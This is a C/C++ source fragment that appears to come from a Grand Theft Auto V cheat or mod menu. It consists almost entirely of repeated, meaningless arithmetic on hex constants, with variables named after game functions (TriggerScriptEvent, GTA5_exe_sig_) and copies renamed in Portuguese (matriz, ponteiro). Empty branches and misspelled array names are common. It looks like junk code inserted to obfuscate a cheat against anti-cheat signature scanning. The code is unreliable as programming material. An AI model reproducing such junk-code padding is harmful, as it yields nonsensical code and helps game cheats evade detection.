			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<ObjectProperties>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
